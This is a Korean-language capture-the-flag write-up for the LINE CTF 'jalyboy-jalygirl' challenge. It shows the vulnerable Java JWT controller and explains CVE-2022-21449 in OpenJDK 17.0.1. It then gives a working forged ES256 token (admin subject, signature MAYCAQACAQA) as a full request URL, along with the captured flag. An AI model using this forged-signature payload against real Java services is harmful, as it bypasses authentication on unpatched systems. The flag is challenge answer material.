## jalyboy-jalygirl

```java
public class JwtController {

    public static final String ADMIN = "admin";
    public static final String GUEST = "guest";
    public static final String UNKNOWN = "unknown";
    public static final String FLAG = System.getenv("FLAG");
    KeyPair keyPair = Keys.keyPairFor(SignatureAlgorithm.ES256);

    @GetMapping("/")
    public String index(@RequestParam(required = false) String j, Model model) {
        String sub = UNKNOWN;
        String jwt_guest = Jwts.builder().setSubject(GUEST).signWith(keyPair.getPrivate()).compact();

        try {
            Jws<Claims> jwt = Jwts.parser().setSigningKey(keyPair.getPublic()).parseClaimsJws(j);
            Claims claims = (Claims) jwt.getBody();
            if (claims.getSubject().equals(ADMIN)) {
                sub = ADMIN;
            } else if (claims.getSubject().equals(GUEST)) {
                sub = GUEST;
            }
        } catch (Exception e) {
//            e.printStackTrace();
        }

        model.addAttribute("jwt", jwt_guest);
        model.addAttribute("sub", sub);
        if (sub.equals(ADMIN)) model.addAttribute("flag", FLAG);

        return "index";
    }
}

```

이전 문제와 다르게 es256 알고리즘을 이용한 서명 검사가 추가되었다.

```Dockerfile
FROM openjdk:17.0.1-jdk-slim

RUN groupadd -g 3000 -o guest
RUN useradd -m -u 1000 -g 3000 -o -s /bin/bash guest
USER guest

WORKDIR /usr/app
```

해당 문제에선 openjdk 17.0.1을 사용하고 있는데 해당 버전의 crypto/ecdsa에는 취약점이 존재하여
공격자가 임의로 생성한 서명값에 대해 올바른 서명으로 인식하도록 하는 것이 가능합니다.

[CVE-2022-21449](https://nvd.nist.gov/vuln/detail/cve-2022-21449)

해당 취약점에 따라 admin으로 jwt token의 body 부분을 수정한 뒤
서명 부분에 `MAYCAQACAQA=`를 추가하면 플래그를 획득할 수 있습니다.

```
http://34.85.123.82:10001/?j=eyJhbGciOiJFUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9.MAYCAQACAQA
```

```
LINECTF{abaa4d1cb9870fd25776a81bbd278932}
```